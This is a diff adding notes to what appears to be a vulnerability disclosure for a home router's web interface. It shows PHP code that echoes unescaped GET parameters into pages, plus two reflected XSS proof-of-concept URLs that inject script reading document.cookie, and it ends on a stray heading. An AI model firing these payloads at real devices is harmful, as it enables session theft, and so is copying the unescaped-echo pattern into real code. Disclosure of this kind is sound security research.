@@ -125,3 +125,41 @@
   s.send(buf)
   ```
 + ![1712902459101](image/poc/1712902459101.png)
+
+### XSS
+
++ xss inside /htdocs/webinc/body/bsc_sms_send.php
+
+  ```php
+  […]
+                  var msgArray =
+                  [
+                          '<?echo i18n("You have successfully configured your router to use OpenDNS Parental Control.");?>',
+                          '<?echo i18n("Do you want to test the function?");?>',
+                          '<p><input type="button" value="<?echo i18n('Test');?>" onclick="window.open(\'http://www.opendns.com/device/welcome/?device_id=<? echo $_GET["deviceid"];?>\')" /><input type="button" value="<?echo i18n('Return');?>" onClick="self.location.href=\'adv_parent_ctrl.php\';" /></p>'
+                  ];
+                  BODY.ShowMessage('<?echo i18n("OpenDNS PARENTAL CONTROLS");?>', msgArray);
+  […]
+  ```
++ poc
+
+  + http://192.168.0.1/bsc_sms_send.php?receiver=">`<script>`alert(document.cookie)`</script>`<"
+
+### XSS
+
++ xss inside /htdocs/ webinc/js/bsc_sms_inbox.php
+
+  + ```
+    […]
+            InitValue: function(xml)
+            {
+                    var get_Treturn = '<?if($_GET["Treturn"]=="") echo "0"; else echo $_GET["Treturn"];?>';
+             … 
+            }
+    […]
+    ```
++ poc
+
+  + http://192.168.0.1/bsc_sms_inbox.php?Treturn=0';alert(document.cookie);get_Treturn='1
+
+XSS
